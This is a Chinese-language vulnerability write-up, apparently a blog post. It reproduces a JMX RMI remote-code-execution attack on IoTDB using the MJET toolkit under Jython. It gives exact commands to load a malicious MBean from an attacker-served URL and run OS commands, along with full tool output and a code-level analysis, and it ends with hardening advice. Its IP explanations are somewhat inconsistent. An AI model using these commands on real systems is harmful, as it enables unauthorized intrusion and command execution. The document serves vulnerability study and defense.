### 使用Jython环境调试POC

为了在历史版本中调试POC，首先需要下载特定版本的Jython。请从以下链接下载所需的Jython版本：
- **下载地址**：[此处应提供具体下载链接]

安装完成后，请配置IDEA以支持Jython项目。打开IDEA，进入`Preferences` -> `Plugins`，搜索并安装`Python`插件。安装完毕后，即可创建Jython项目。

将恶意的`jar`包和`mjet.py`文件复制到项目目录中，并按照以下步骤配置POC。

### 漏洞复现
**POC:**
```bash
java -jar jython-standalone-2.7.0.jar mjet.py 10.10.10.182 31999 install super_secret http://10.10.10.182:8000/ 8000
java -jar jython-standalone-2.7.0.jar mjet.py 127.0.0.1 31999 command super_secret "ls -l"
```
首先部署恶意MBean，其中第一个IP地址（10.10.10.182）为易受攻击主机的IP地址，该主机上运行着易受攻击的JMX服务；第二个IP地址（127.0.0.1）为攻击者的IP地址，JMX服务将连接至攻击者的Web服务，从而下载有效载荷`jar`文件。`mjet`将在端口8000启动必要的Web服务。
成功安装MBean后，默认密码将被更改为命令行中提供的密码`super_secret`。

#### 示例输出
```bash
hu4wufu@bogon mjet-master % java -jar jython-standalone-2.7.0.jar mjet.py 10.10.10.182 31999 install super_secret http://10.10.10.182:8000/ 8000
MJET - MOGWAI LABS JMX Exploitation Toolkit
===========================================
[+] Starting webserver at port 8000   
[+] Using JMX RMI   
[+] Connecting to: service:jmx:rmi:///jndi/rmi://10.10.10.182:31999/jmxrmi
[+] Connected: rmi://10.10.10.182  2
[+] Loaded javax.management.loading.MLet
[+] Loading malicious MBean from http://10.10.10.182:8000/
[+] Invoking: javax.management.loading.MLet.getMBeansFromURL
10.10.10.182 - - [10/Sep/2020 15:55:33] "GET / HTTP/1.1" 200 -    
10.10.10.182 - - [10/Sep/2020 15:55:33] "GET /azmzjazz.jar HTTP/1.1" 200 -    
[+] Successfully loaded MBeanMogwaiLabs:name=payload,id=1
[+] Changing default password...
[+] Loaded de.mogwailabs.MogwaiLabsMJET.MogwaiLabsPayload
[+] Successfully changed password
[+] Done
```

安装有效负载后，执行操作系统命令`“ls -l”`：
```bash
hu4wufu@bogon mjet-master % java -jar jython-standalone-2.7.0.jar mjet.py 127.0.0.1 31999 command super_secret "ls -l"
MJET - MOGWAI LABS JMX Exploitation Toolkit
===========================================
[+] Using JMX RMI
[+] Connecting to: service:jmx:rmi:///jndi/rmi://127.0.0.1:31999/jmxrmi
[+] Connected: rmi://10.10.10.182  3
[+] Loaded de.mogwailabs.MogwaiLabsMJET.MogwaiLabsPayload
[+] Executing command: ls -l
total 56
drwxr-xr-x@ 3 hu4wufu  staff    96  9  7 21:43 data
-rw-------  1 hu4wufu  staff   165  9  7 15:02 nohup.out
-rwx------@ 1 hu4wufu  staff  2002 11 20  2019 start-client.bat
-rwx------@ 1 hu4wufu  staff  1556  9  8 18:14 start-client.sh
-rwx------@ 1 hu4wufu  staff  3126  9  8 16:36 start-server.bat
-rwx------@ 1 hu4wufu  staff  2054  9  9 14:41 start-server.sh
-rwx------  1 hu4wufu  staff  1034  8 26  2019 stop-server.bat
-rwx------  1 hu4wufu  staff   999  8 26  2019 stop-server.sh
```

### 漏洞分析
远程注册MBean的过程涉及使用Jython环境。每个MBean都必须实现一个接口，且接口名称需以`MBean`结尾，如本例中的`MogwailLabsPayloadMBean`。接下来，我们需要实现这个MBean，实现类名为去掉`MBean`后缀的部分，即`MogwailLabsPayload`。在此类中定义的方法可以在MBeanServer中随意调用。

通过分析`mjet.py`的`installMode()`函数，可以看到它如何向JMX注册`mjet`。此函数首先连接到JMX服务，然后根据参数创建SSL连接，并判断JMXMP类型（此处为`jxmrmi`）。随后，确定JMX服务的地址和端口，并传递包括密码、payload URL等在内的参数。

在`installMBean()`函数中，JMX在目标服务器上创建`javax.management.loading.MLet`实例，并调用其`getMBeansFromURL`方法加载恶意MBean对象。这些操作最终使得恶意MBean能够在JMX服务中注册，并可由攻击者通过密码访问以执行任意命令。

### 总结
JMX漏洞是一种通用型漏洞，适用于所有开启了JMX服务的Java系统。自iotDB 0.9.2版本起，默认设置`JMX_LOCAL="true"`关闭了远程访问功能。若要启用远程连接，则需将`JMX_local`设为`false`，此时会采用用户名密码控制。

因此，启用身份验证来保护JMX服务至关重要。此外，确保JDK环境是最新的也非常重要，因为过时的JDK可能包含已被修复的安全漏洞，即使启用了身份验证也可能遭受攻击。

### 参考资料
- [Exploiting JMX RMI](https://webcache.googleusercontent.com/search?q=cache%3Ahttps%3A%2F%2Fwww.optiv.com%2Fblog%2Fexploiting-jmx-rmi&oq=cache%3Ahttps%3A%2F%2Fwww.optiv.com%2Fblog%2Fexploiting-jmx-rmi&aqs=chrome%E2%80%A669i57j69i58.1641j0j7&sourceid=chrome&ie=UTF-8)